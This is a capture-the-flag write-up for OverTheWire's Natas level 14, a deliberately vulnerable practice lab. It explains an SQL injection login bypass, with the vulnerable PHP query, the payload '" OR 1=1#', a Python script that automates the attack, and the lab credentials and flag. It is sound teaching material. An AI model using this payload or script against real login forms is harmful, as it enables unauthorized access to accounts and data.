# Natas Level 14 Writeup (natas14) – OverTheWire

## Overview

This level focuses on exploiting a SQL injection vulnerability in a login form.          
The goal is to find the password for the next level.

## Observation

When we open the page, we see a login form asking for:
- Username  
- Password

There is also a link to view the source code:

```
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite
1. Open the source code.
2. It shows the `PHP` logic used:
    ```php
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
                echo "Successful login! The password for natas15 is <censored><br>";
        } else {
                echo "Access denied!<br>";
        }
    ```
    It shows User input is directly concatenated into the SQL query without sanitization.
3. SQL Injection to bypass Authentication:
    ```
    Username: " OR 1=1#
    Password: anything
    ```
4. The query becomes:
    ```sql
    SELECT * FROM users WHERE username="" OR 1=1# " AND password="anything"
    ```
    `OR 1=1` makes the condition always true.  
    `#` commented out remaining query.
5. Click on `login` to Submit the form.  
    The server returns a successful login and reveals the password.


#### Proof
```text
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

### Using Python

```python
import requests, re

session = requests.Session()
base_url = "http://natas14.natas.labs.overthewire.org/"
session.auth = ("natas14", "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ")

# # step 1: Extract login form and Get source code 
# res = session.get(base_url)
# match = re.search(r'<body>(.*?)</body>', res.text, re.DOTALL)
# print(match.group(1))

# # Step 2: Reveal php logic used in source code
# from bs4 import BeautifulSoup  # install with 'pip install bs4'
# url = base_url + "index-source.html"
# res = session.get(url)
# soup = BeautifulSoup(res.text, 'html.parser')
# clean_text = soup.get_text()
# match = re.search(r'<\?php(.*?)\?>', clean_text, re.DOTALL)
# print(match.group(1))

# Step 3: Get Flag
data = {
    'username' : '" OR 1=1#',
    'password' : 'anything'
}
res = session.post(url=base_url, data=data)
match = re.search(r'is\W(.*?)<br>', res.text)
print(f"Password for next level is: {match.group(1)}")
```

## Vulnerability

User input is directly concatenated into an SQL query without sanitization, leading to SQL injection.

## Flag
`SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`